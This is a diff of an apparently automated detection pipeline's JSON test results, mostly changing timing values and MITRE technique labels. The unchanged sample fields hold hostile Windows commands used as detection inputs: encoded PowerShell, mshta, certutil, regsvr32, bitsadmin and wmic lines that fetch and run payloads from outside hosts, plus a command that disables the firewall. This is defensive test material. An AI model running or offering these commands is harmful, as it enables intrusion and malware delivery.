@@ -224,7 +224,7 @@
               }
             ]
           },
-          "elapsed_ms": 211.2,
+          "elapsed_ms": 155.2,
           "status": 200
         },
         "die": {
@@ -579,7 +579,7 @@
               ]
             }
           },
-          "elapsed_ms": 137.7,
+          "elapsed_ms": 110.0,
           "status": 200
         },
         "narrate": {
@@ -644,7 +644,7 @@
               ]
             }
           },
-          "elapsed_ms": 135.3,
+          "elapsed_ms": 130.9,
           "status": 200
         },
         "upload": {
@@ -672,7 +672,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 144.6,
+          "elapsed_ms": 137.5,
           "status": 200
         }
       },
@@ -760,7 +760,7 @@
               }
             ]
           },
-          "elapsed_ms": 208.5,
+          "elapsed_ms": 158.2,
           "status": 200
         },
         "die": {
@@ -1115,7 +1115,7 @@
               ]
             }
           },
-          "elapsed_ms": 105.4,
+          "elapsed_ms": 104.3,
           "status": 200
         },
         "narrate": {
@@ -1180,7 +1180,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.1,
+          "elapsed_ms": 99.3,
           "status": 200
         },
         "upload": {
@@ -1208,7 +1208,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 145.8,
+          "elapsed_ms": 102.7,
           "status": 200
         }
       }
@@ -1363,7 +1363,7 @@
               {
                 "id": "T1566.001",
                 "tactic": "Initial Access",
-                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)"
+                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/SCR/VBS/WSF/JAR or double-extension lure)"
               }
             ],
             "osint": null,
@@ -1388,7 +1388,7 @@
               }
             ]
           },
-          "elapsed_ms": 2340.1,
+          "elapsed_ms": 1821.1,
           "status": 200
         },
         "die": {
@@ -1573,7 +1573,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 106.6,
+          "elapsed_ms": 102.0,
           "status": 200
         },
         "narrate": {
@@ -1607,7 +1607,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 108.9,
+          "elapsed_ms": 101.8,
           "status": 200
         },
         "upload": {
@@ -1635,7 +1635,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 99.9,
+          "elapsed_ms": 98.4,
           "status": 200
         }
       },
@@ -1684,7 +1684,7 @@
               {
                 "id": "T1566.001",
                 "tactic": "Initial Access",
-                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)"
+                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/SCR/VBS/WSF/JAR or double-extension lure)"
               }
             ],
             "osint": null,
@@ -1709,7 +1709,7 @@
               }
             ]
           },
-          "elapsed_ms": 4129.1,
+          "elapsed_ms": 2327.5,
           "status": 200
         },
         "die": {
@@ -1894,7 +1894,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 106.8,
+          "elapsed_ms": 199.3,
           "status": 200
         },
         "narrate": {
@@ -1928,7 +1928,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 102.1,
+          "elapsed_ms": 173.0,
           "status": 200
         },
         "upload": {
@@ -1956,7 +1956,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 104.8,
+          "elapsed_ms": 143.3,
           "status": 200
         }
       }
@@ -2161,7 +2161,7 @@
               }
             ]
           },
-          "elapsed_ms": 1135.0,
+          "elapsed_ms": 8250.0,
           "status": 200
         },
         "die": {
@@ -2381,7 +2381,7 @@
               ]
             }
           },
-          "elapsed_ms": 103.1,
+          "elapsed_ms": 118.6,
           "status": 200
         },
         "narrate": {
@@ -2441,7 +2441,7 @@
               ]
             }
           },
-          "elapsed_ms": 104.7,
+          "elapsed_ms": 96.9,
           "status": 200
         },
         "upload": {
@@ -2469,7 +2469,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 147.4,
+          "elapsed_ms": 208.4,
           "status": 200
         }
       },
@@ -2552,7 +2552,7 @@
               }
             ]
           },
-          "elapsed_ms": 8232.3,
+          "elapsed_ms": 862.9,
           "status": 200
         },
         "die": {
@@ -2772,7 +2772,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.4,
+          "elapsed_ms": 106.8,
           "status": 200
         },
         "narrate": {
@@ -2832,7 +2832,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.7,
+          "elapsed_ms": 96.2,
           "status": 200
         },
         "upload": {
@@ -2860,7 +2860,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 103.0,
+          "elapsed_ms": 130.6,
           "status": 200
         }
       }
@@ -3049,7 +3049,7 @@
               }
             ]
           },
-          "elapsed_ms": 896.4,
+          "elapsed_ms": 1130.2,
           "status": 200
         },
         "die": {
@@ -3301,7 +3301,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 133.7,
+          "elapsed_ms": 104.1,
           "status": 200
         },
         "narrate": {
@@ -3354,7 +3354,7 @@
               ]
             }
           },
-          "elapsed_ms": 131.5,
+          "elapsed_ms": 99.4,
           "status": 200
         },
         "upload": {
@@ -3382,7 +3382,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 131.8,
+          "elapsed_ms": 103.3,
           "status": 200
         }
       },
@@ -3463,7 +3463,7 @@
               }
             ]
           },
-          "elapsed_ms": 1168.7,
+          "elapsed_ms": 8254.8,
           "status": 200
         },
         "die": {
@@ -3715,7 +3715,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 105.0,
+          "elapsed_ms": 134.5,
           "status": 200
         },
         "narrate": {
@@ -3768,7 +3768,7 @@
               ]
             }
           },
-          "elapsed_ms": 206.6,
+          "elapsed_ms": 97.3,
           "status": 200
         },
         "upload": {
@@ -3796,7 +3796,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 102.8,
+          "elapsed_ms": 97.7,
           "status": 200
         }
       }
@@ -3870,8 +3870,7 @@
             "T1047",
             "T1059.001",
             "T1059.003",
-            "T1105",
-            "T1566.001"
+            "T1105"
           ],
           "risk_level": "high",
           "risk_score_bucket": 100,
@@ -3939,8 +3938,7 @@
             "T1047",
             "T1059.001",
             "T1059.003",
-            "T1105",
-            "T1566.001"
+            "T1105"
           ],
           "risk_level": "high",
           "risk_score_bucket": 100,
@@ -4033,11 +4031,6 @@
                 "id": "T1047",
                 "tactic": "Execution",
                 "technique": "wmic process call create fragment (remote/local process spawn)"
-              },
-              {
-                "id": "T1566.001",
-                "tactic": "Initial Access",
-                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)"
               }
             ],
             "osint": null,
@@ -4074,7 +4067,7 @@
               }
             ]
           },
-          "elapsed_ms": 936.2,
+          "elapsed_ms": 1070.9,
           "status": 200
         },
         "die": {
@@ -4479,7 +4472,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.9,
+          "elapsed_ms": 262.5,
           "status": 200
         },
         "narrate": {
@@ -4555,7 +4548,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.4,
+          "elapsed_ms": 107.2,
           "status": 200
         },
         "upload": {
@@ -4583,7 +4576,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 106.2,
+          "elapsed_ms": 124.4,
           "status": 200
         }
       },
@@ -4672,11 +4665,6 @@
                 "id": "T1047",
                 "tactic": "Execution",
                 "technique": "wmic process call create fragment (remote/local process spawn)"
-              },
-              {
-                "id": "T1566.001",
-                "tactic": "Initial Access",
-                "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)"
               }
             ],
             "osint": null,
@@ -4713,7 +4701,7 @@
               }
             ]
           },
-          "elapsed_ms": 890.8,
+          "elapsed_ms": 8248.7,
           "status": 200
         },
         "die": {
@@ -5118,7 +5106,7 @@
               ]
             }
           },
-          "elapsed_ms": 105.3,
+          "elapsed_ms": 103.2,
           "status": 200
         },
         "narrate": {
@@ -5194,7 +5182,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.6,
+          "elapsed_ms": 117.4,
           "status": 200
         },
         "upload": {
@@ -5222,7 +5210,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 103.8,
+          "elapsed_ms": 111.7,
           "status": 200
         }
       }
@@ -5344,7 +5332,7 @@
               }
             ]
           },
-          "elapsed_ms": 156.0,
+          "elapsed_ms": 154.2,
           "status": 200
         },
         "die": {
@@ -5361,7 +5349,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 109.3,
+          "elapsed_ms": 130.0,
           "status": 200
         },
         "narrate": {
@@ -5376,7 +5364,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 100.1,
+          "elapsed_ms": 157.4,
           "status": 200
         },
         "upload": {
@@ -5404,7 +5392,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 127.3,
+          "elapsed_ms": 162.1,
           "status": 200
         }
       },
@@ -5448,7 +5436,7 @@
               }
             ]
           },
-          "elapsed_ms": 152.5,
+          "elapsed_ms": 150.7,
           "status": 200
         },
         "die": {
@@ -5465,7 +5453,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 106.9,
+          "elapsed_ms": 100.7,
           "status": 200
         },
         "narrate": {
@@ -5480,7 +5468,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.9,
+          "elapsed_ms": 97.3,
           "status": 200
         },
         "upload": {
@@ -5508,7 +5496,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 105.9,
+          "elapsed_ms": 103.8,
           "status": 200
         }
       }
@@ -5654,7 +5642,7 @@
               }
             ]
           },
-          "elapsed_ms": 152.4,
+          "elapsed_ms": 151.4,
           "status": 200
         },
         "die": {
@@ -5734,7 +5722,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 106.1,
+          "elapsed_ms": 95.2,
           "status": 200
         },
         "narrate": {
@@ -5749,7 +5737,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 98.2,
+          "elapsed_ms": 99.4,
           "status": 200
         },
         "upload": {
@@ -5777,7 +5765,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 99.3,
+          "elapsed_ms": 111.1,
           "status": 200
         }
       },
@@ -5837,7 +5825,7 @@
               }
             ]
           },
-          "elapsed_ms": 281.0,
+          "elapsed_ms": 151.7,
           "status": 200
         },
         "die": {
@@ -5917,7 +5905,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 100.5,
+          "elapsed_ms": 97.2,
           "status": 200
         },
         "narrate": {
@@ -5960,7 +5948,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 103.4,
+          "elapsed_ms": 150.5,
           "status": 200
         }
       }
@@ -6182,7 +6170,7 @@
               }
             ]
           },
-          "elapsed_ms": 155.6,
+          "elapsed_ms": 210.7,
           "status": 200
         },
         "die": {
@@ -6499,7 +6487,7 @@
               ]
             }
           },
-          "elapsed_ms": 109.6,
+          "elapsed_ms": 108.6,
           "status": 200
         },
         "narrate": {
@@ -6575,7 +6563,7 @@
               ]
             }
           },
-          "elapsed_ms": 102.0,
+          "elapsed_ms": 99.1,
           "status": 200
         },
         "upload": {
@@ -6603,7 +6591,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 152.2,
+          "elapsed_ms": 116.6,
           "status": 200
         }
       },
@@ -6691,7 +6679,7 @@
               }
             ]
           },
-          "elapsed_ms": 150.7,
+          "elapsed_ms": 156.3,
           "status": 200
         },
         "die": {
@@ -7008,7 +6996,7 @@
               ]
             }
           },
-          "elapsed_ms": 105.7,
+          "elapsed_ms": 118.4,
           "status": 200
         },
         "narrate": {
@@ -7084,7 +7072,7 @@
               ]
             }
           },
-          "elapsed_ms": 111.8,
+          "elapsed_ms": 114.0,
           "status": 200
         },
         "upload": {
@@ -7112,7 +7100,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 105.1,
+          "elapsed_ms": 104.2,
           "status": 200
         }
       }
@@ -7217,7 +7205,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 157.0,
+          "elapsed_ms": 154.8,
           "status": 200
         },
         "die": {
@@ -7234,7 +7222,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 103.5,
+          "elapsed_ms": 99.8,
           "status": 200
         },
         "narrate": {
@@ -7249,7 +7237,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 104.6,
+          "elapsed_ms": 100.9,
           "status": 200
         },
         "upload": {
@@ -7275,7 +7263,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 113.4,
+          "elapsed_ms": 105.0,
           "status": 200
         }
       },
@@ -7306,7 +7294,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 154.3,
+          "elapsed_ms": 165.7,
           "status": 200
         },
         "die": {
@@ -7323,7 +7311,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 97.1,
+          "elapsed_ms": 144.7,
           "status": 200
         },
         "narrate": {
@@ -7338,7 +7326,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 102.2,
+          "elapsed_ms": 97.0,
           "status": 200
         },
         "upload": {
@@ -7364,7 +7352,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 102.4,
+          "elapsed_ms": 99.0,
           "status": 200
         }
       }
@@ -7443,7 +7431,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 98.1,
+          "elapsed_ms": 114.1,
           "status": 200
         },
         "narrate": {
@@ -7473,7 +7461,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 99.7,
+          "elapsed_ms": 114.1,
           "status": 200
         }
       },
@@ -7496,7 +7484,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 95.2,
+          "elapsed_ms": 98.9,
           "status": 200
         },
         "narrate": {
@@ -7526,7 +7514,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 115.9,
+          "elapsed_ms": 158.4,
           "status": 200
         }
       }
@@ -7720,7 +7708,7 @@
               }
             ]
           },
-          "elapsed_ms": 1340.1,
+          "elapsed_ms": 1015.1,
           "status": 200
         },
         "die": {
@@ -7938,7 +7926,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.1,
+          "elapsed_ms": 110.8,
           "status": 200
         },
         "narrate": {
@@ -7998,7 +7986,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.3,
+          "elapsed_ms": 100.3,
           "status": 200
         },
         "upload": {
@@ -8026,7 +8014,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 102.5,
+          "elapsed_ms": 101.4,
           "status": 200
         }
       },
@@ -8100,7 +8088,7 @@
               }
             ]
           },
-          "elapsed_ms": 6945.3,
+          "elapsed_ms": 673.7,
           "status": 200
         },
         "die": {
@@ -8318,7 +8306,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.3,
+          "elapsed_ms": 97.1,
           "status": 200
         },
         "narrate": {
@@ -8378,7 +8366,7 @@
               ]
             }
           },
-          "elapsed_ms": 102.9,
+          "elapsed_ms": 102.2,
           "status": 200
         },
         "upload": {
@@ -8406,7 +8394,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 172.0,
+          "elapsed_ms": 125.5,
           "status": 200
         }
       }
@@ -8597,7 +8585,7 @@
               }
             ]
           },
-          "elapsed_ms": 154.7,
+          "elapsed_ms": 163.0,
           "status": 200
         },
         "die": {
@@ -9032,7 +9020,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 98.3,
           "status": 200
         },
         "narrate": {
@@ -9090,7 +9078,7 @@
               ]
             }
           },
-          "elapsed_ms": 93.6,
+          "elapsed_ms": 95.1,
           "status": 200
         },
         "upload": {
@@ -9118,7 +9106,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 126.8,
+          "elapsed_ms": 100.4,
           "status": 200
         }
       },
@@ -9193,7 +9181,7 @@
               }
             ]
           },
-          "elapsed_ms": 155.1,
+          "elapsed_ms": 155.7,
           "status": 200
         },
         "die": {
@@ -9628,7 +9616,7 @@
               ]
             }
           },
-          "elapsed_ms": 104.7,
+          "elapsed_ms": 112.9,
           "status": 200
         },
         "narrate": {
@@ -9686,7 +9674,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.1,
+          "elapsed_ms": 95.5,
           "status": 200
         },
         "upload": {
@@ -9714,7 +9702,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 106.8,
+          "elapsed_ms": 103.3,
           "status": 200
         }
       }
